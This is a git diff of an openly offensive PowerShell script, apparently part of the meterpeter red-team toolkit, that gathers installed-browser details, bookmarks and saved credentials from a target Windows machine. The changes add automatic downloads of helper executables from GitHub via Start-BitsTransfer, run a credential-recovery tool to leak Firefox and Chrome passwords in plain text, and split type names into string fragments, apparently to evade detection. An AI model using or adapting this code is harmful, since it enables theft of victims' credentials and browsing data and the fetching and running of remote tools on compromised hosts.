@@ -1,11 +1,11 @@
-<#
+﻿<#
 .SYNOPSIS
   Standalone Powershell Script to Leak Installed Browsers Information.
 
   Author: r00t-3xp10it (SSA RedTeam @2020)
   Required Dependencies: (iexplore|msedge), Firefox, Chrome
   Optional Dependencies: mozlz4-win32.exe, DarkRCovery.exe
-  PS Script Dev Version: v1.18
+  PS Script Dev Version: v1.19
 
 .DESCRIPTION
    Standalone Powershell script to leak Installed browsers information sutch as: Home Page,
@@ -75,24 +75,12 @@
     https://github.com/r00t-3xp10it/meterpeter/tree/master/mimiRatz/mozlz4-win32.exe
 #>
 
-# powershell -executionpolicy bypass -w 1 -command (New-Object System.Net.WebClient).DownloadFile("https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/DarkRCovery.rar","$env:tmp\DarkRCovery.rar");cmd /R set unrar="%programFiles%\WinRAR\UnRAR.exe" && cd %tmp% && %unrar% e "DarkRCovery.rar"
-
-
-# param (
-#  [Parameter(Mandatory=$true,Position=0)]$IE,
-#  [Parameter(Mandatory=$true,Position=0)]$RECON,
-#  [Parameter(Mandatory=$true,Position=0)]$CHROME,
-#  [Parameter(Mandatory=$true,Position=0)]$FIREFOX,
-#  [Parameter(Mandatory=$false,Position=1)][string]$LOGFILEPATH
-# )
-
-
-$IPATH = pwd
 $Path = $null
 $mpset = $False
 $param1 = $args[0] # User Inputs [Arguments]
 $param2 = $args[1] # User Inputs [Arguments]
-$host.UI.RawUI.WindowTitle = " @GetBrowsers v1.18"
+$IPATH = pwd|Select-Object -ExpandProperty Path
+$host.UI.RawUI.WindowTitle = " @GetBrowsers v1.19"
 ## Auto-Set @Args in case of User empty inputs (Set LogFile Path).
 If(-not($param2)){$LogFilePath = "$env:TMP"}else{If($param2 -match '^[0-9]'){$LogFilePath = "$env:TMP";$param2 = $param2}else{$LogFilePath = "$param2";$mpset = $True}}
 If(-not($param1)){
@@ -184,14 +172,6 @@ echo "$deliverdata" >> $LogFilePath\BrowserEnum.log
 ## END Off { @args -WINVER }
 
 
-function ConvertFrom-Json20([object] $item){
-    ## Json Files Convertion to text
-    Add-Type -AssemblyName System.Web.Extensions
-    $ps_js = New-Object System.Web.Script.Serialization.JavaScriptSerializer
-    return ,$ps_js.DeserializeObject($item)    
-}
-
-
 function BROWSER_RECON {
     ## New MicrosoftEdge Update have changed the binary name to 'msedge' ..
     $CheckVersion = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Internet Explorer" -ErrorAction SilentlyContinue).version
@@ -243,7 +223,7 @@ function BROWSER_RECON {
     echo "-------   -------   ------   -------         ----------" >> $LogFilePath\BrowserEnum.log
     echo "IE        $IEfound  $iStatus   $IEVersion    $id" >> $LogFilePath\BrowserEnum.log
     echo "CHROME    $CHfound  $cStatus   $Chrome_App   $cd" >> $LogFilePath\BrowserEnum.log
-    echo "FIREFOX   $FFfound  $fStatus   $ParsingData          $fd" >> $LogFilePath\BrowserEnum.log
+    echo "FIREFOX   $FFfound  $fStatus   $ParsingData            $fd" >> $LogFilePath\BrowserEnum.log
     ## Get-NetAdapter { Interfaces Available }
     $Interfaces = Get-NetAdapter|Select-Object Status,InterfaceDescription -ErrorAction SilentlyContinue
     If($Interfaces){echo "`n" $Interfaces >> $LogFilePath\BrowserEnum.log}
@@ -580,20 +560,12 @@ function FIREFOX {
             Copy-Item -Path "$Final" -Destination "$env:tmp\output.jsonlz4" -Force
         }
     
-        If(-not(Test-Path "$env:tmp\mozlz4-win32.exe")){
-            echo "Upload: meterpeter\mimiRatz\mozlz4-win32.exe to target `$env:tmp" >> $LogFilePath\BrowserEnum.log
-            echo "Execute: [ ./GetBrowsers.ps1 -FIREFOX ] again for clean outputs" >> $LogFilePath\BrowserEnum.log
-            echo "URL: https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/mozlz4-win32.exe" >> $LogFilePath\BrowserEnum.log
-            ## mozlz4-win32.exe Firefox Fail dependencie bypass
-            # I cant use 'ConvertFrom-Json' cmdlet because it gives
-            # 'primitive JSON invalid error' parsing .jsonlz4 files to TEXT|CSV ..  
-            $Json = Get-Content "$Bookmarks_Path" -Raw
-            $Regex = $Json -replace '[^a-zA-Z0-9/:. ]','' # Replace all chars that does NOT match the Regex
-                ForEach ($Key in $Regex){
-                    echo "`n" $Key >> $LogFilePath\BrowserEnum.log
-                }
-        }else{
-            cd $env:tmp
+        If(-not(Test-Path "$Env:TMP\mozlz4-win32.exe")){
+
+            ## Download mozlz4-win32.exe from meterpeter github repo
+            Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/mozlz4-win32.exe -Destination $Env:TMP\mozlz4-win32.exe -ErrorAction SilentlyContinue|Out-Null   
+
+            cd $Env:TMP
             ## Convert from jsonlz4 to json
             .\mozlz4-win32.exe --extract output.jsonlz4 output.json
             $DumpFileData = Get-Content "$env:tmp\output.json" -Raw
@@ -604,10 +576,43 @@ function FIREFOX {
             echo $ParsingData >> $LogFilePath\BrowserEnum.log
             Remove-Item -Path "$env:tmp\output.json" -Force -ErrorAction SilentlyContinue
             Remove-Item -Path "$env:tmp\output.jsonlz4" -Force -ErrorAction SilentlyContinue
+
+            <#
+            .SYNOPSIS
+               mozlz4-win32.exe Firefox Fail dependencie bypass
+
+            .DESCRIPTION
+               I cant use 'ConvertFrom-Json' cmdlet because it gives 'primitive
+               JSON invalid error' parsing .jsonlz4 files to TEXT|CSV format ..
+
+            #>
+
+            ## [ deprecated function ]
+            # $Json = Get-Content "$Bookmarks_Path" -Raw
+            # $Regex = $Json -replace '[^a-zA-Z0-9/:. ]','' # Replace all chars that does NOT match the Regex
+            #    ForEach ($Key in $Regex){
+            #        echo "`n" $Key >> $LogFilePath\BrowserEnum.log
+            #    }
+
+        }Else{
+
+            cd $Env:TMP
+            ## Convert from jsonlz4 to json
+            .\mozlz4-win32.exe --extract output.jsonlz4 output.json
+            $DumpFileData = Get-Content "$env:tmp\output.json" -Raw
+            $SplitString = $DumpFileData.split(',')
+            $findUri = $SplitString|findstr /I /C:"uri"
+            $Deliconuri = $findUri|findstr /V /C:"iconuri"
+            $ParsingData = $Deliconuri -replace '"','' -replace 'uri:','' -replace '}','' -replace ']',''
+            echo $ParsingData >> $LogFilePath\BrowserEnum.log
+            Remove-Item -Path "$env:tmp\output.json" -Force -ErrorAction SilentlyContinue
+            Remove-Item -Path "$env:tmp\output.jsonlz4" -Force -ErrorAction SilentlyContinue
+
         }
     }
     cd $IPATH
-    If(Test-Path "$env:tmp\output.jsonlz4"){Remove-Item -Path "$env:tmp\output.jsonlz4" -Force}
+    If(Test-Path "$Env:TMP\output.jsonlz4"){Remove-Item -Path "$Env:TMP\output.jsonlz4" -Force}
+    If(Test-Path "$Env:TMP\mozlz4-win32.exe"){Remove-Item -Path "$Env:TMP\mozlz4-win32.exe" -Force}
 
     ## Retrieve Firefox logins
     echo "`nEnumerating LogIns" >> $LogFilePath\BrowserEnum.log
@@ -631,6 +636,14 @@ function FIREFOX {
     }
 }
 
+
+function ConvertFrom-Json20([object] $item){
+    $RawString = "System.W"+"eb.Ext"+"ensions" -Join ''
+    $JavaSerial = "System.W"+"eb.Scri"+"pt.Serial"+"ization.Jav"+"aScriptSe"+"rializer" -Join ''
+    Add-Type -AssemblyName $RawString
+    $powers_js = New-Object $JavaSerial
+    return ,$powers_js.DeserializeObject($item) 
+}
 
 function CHROME {
     ## Retrieve Google Chrome Browser Information
@@ -757,7 +770,7 @@ function CHROME {
             echo "{Could not find any Bookmarks}" >> $LogFilePath\BrowserEnum.log
         }else{
             $Json = Get-Content "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Bookmarks"
-            $Output = ConvertFrom-Json20($Json)
+            $Output = ConvertFrom-Json20($Json) ## TODO:
             $Jsonobject = $Output.roots.bookmark_bar.children
             $Jsonobject.url|Sort -Unique|ForEach-Object {
                 if ($_ -match $Search) {
@@ -900,6 +913,12 @@ function CREDS_DUMP {
     # DarkRCovery requires to be uploaded to $env:TMP { Client working dir }
     echo "`n`n[ Leak credentials => By 0xyg3n ]" >> $LogFilePath\BrowserEnum.log
     echo "---------------------------------" >> $LogFilePath\BrowserEnum.log
+
+    If(-not(Test-Path "$env:TMP\DarkRCovery.exe")){
+        Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/venom/master/bin/meterpeter/mimiRatz/DarkRCovery.exe -Destination $env:TMP\DarkRCovery.exe|Out-Null
+    }
+
+
     If(Test-Path "$env:TMP\DarkRCovery.exe"){
     cd $env:TMP;Start-Process "$env:TMP\DarkRCovery.exe" -Wait # Wait for DarkRCovery.exe to finish ..
         If(Test-Path "$env:TMP\Leaked.txt"){
@@ -922,10 +941,6 @@ function CREDS_DUMP {
             echo "Not found => `$env:TMP\Leaked.txt" >> $LogFilePath\BrowserEnum.log
             cd $IPATH
         }
-    }else{
-        echo "Upload: meterpeter\mimiRatz\DarkRCovery.exe to target `$env:TMP directory" >> $LogFilePath\BrowserEnum.log
-        echo "Execute: [ ./GetBrowsers.ps1 -CREDS ] to leak firefox|chrome credentials (plain text)" >> $LogFilePath\BrowserEnum.log
-        echo "URL: https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/DarkRCovery.exe" >> $LogFilePath\BrowserEnum.log
     }
     
     ## Search for passwords in { ConsoleHost_history }
@@ -1046,4 +1061,3 @@ If($param1 -eq "-ALL"){BROWSER_RECON;IE_Dump;FIREFOX;CHROME}
 Get-Content $LogFilePath\BrowserEnum.log;Write-Host "`n";
 If($mpset -eq $False){Remove-Item $LogFilePath\BrowserEnum.log -Force}
 Exit
-
